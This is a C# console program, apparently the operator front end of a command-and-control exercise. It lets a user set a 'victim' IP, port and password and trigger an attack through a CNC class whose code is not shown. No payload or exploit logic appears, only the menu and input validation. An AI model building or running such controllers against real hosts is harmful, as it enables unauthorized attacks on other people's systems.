using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.Net;

namespace CNC
{
    class Program
    {
        static void Main(string[] args)
        {

            CNC control = new CNC("bitches be riches");
            new Thread(new ThreadStart(control.listen)).Start();
            String IP="127.0.0.1";
            String port="12566";
            String password="zazapo";
            bool stop = false;
            while (!stop)
            {

                Console.WriteLine("please choose an option");
                Console.WriteLine("1 -> set victim info");
                Console.WriteLine("2 -> attack victim");
                Console.WriteLine("3 -> end");

                switch (Console.ReadLine().Trim())
                {
                    case "1":
                        Console.WriteLine("please enter victim IP ");
                        IP = Console.ReadLine().Trim();

                        Console.WriteLine("please enter victim PORT");
                        port = Console.ReadLine().Trim();

                        Console.WriteLine("please enter victim password ");
                        password = Console.ReadLine().Trim();
                        break;
                    case "2":
                        if (checkIPandPort(IP, port,password))
                        {
                            control.attack(IP,Convert.ToUInt16(port),password);
                        }
                        else
                        {
                            Console.WriteLine("illegal IP or Port!!!");
                        }
                        break;
                    case "3":
                        stop = true;
                        break;
                    
                        
                }

            }

        
           

        }

        private static bool checkIPandPort(string iP, string port,string password)
        {
            bool ans = true;
            try
            {
                IPAddress.Parse(iP);
                Convert.ToUInt16(port);
                byte[] x = Encoding.ASCII.GetBytes(password);
                if (x.Length != 6)
                    ans = false;
            }
            catch
            {
                return false;
            }
            
            return ans;
        }
    }
}
